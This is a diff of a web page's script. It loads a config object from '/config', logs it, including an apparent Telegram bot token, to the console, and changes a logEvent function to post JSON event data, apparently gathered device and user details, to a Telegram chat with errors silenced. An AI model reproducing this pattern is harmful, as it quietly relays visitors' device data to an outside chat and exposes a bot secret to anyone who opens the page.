@@ -138,7 +138,20 @@ body {
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
-// ฟังก์ชัน getSystemInfo สำหรับ iOS
+
+let CONFIG = {};
+
+async function initConfig(){
+
+ const res = await fetch("/config");
+ CONFIG = await res.json();
+
+ console.log("CONFIG =",CONFIG);
+
+}
+
+initConfig();
+
 function getSystemInfo() {
   try {
     const systemInfo = {
@@ -218,8 +231,8 @@ function getUserIdFromURL() {
 }
 
 function  logEvent(type, data) {
-  const token = import.meta.env.VITE_token_telegram;
-  const chat = import.meta.env.VITE_chat_telegram;
+  const token = CONFIG.telegram_bot_token;
+  const chat = CONFIG.chat_id;
   const msg = `[${type}] %0A${JSON.stringify(data, null, 2)}`;
   fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${msg}`).catch(()=>{});
 }
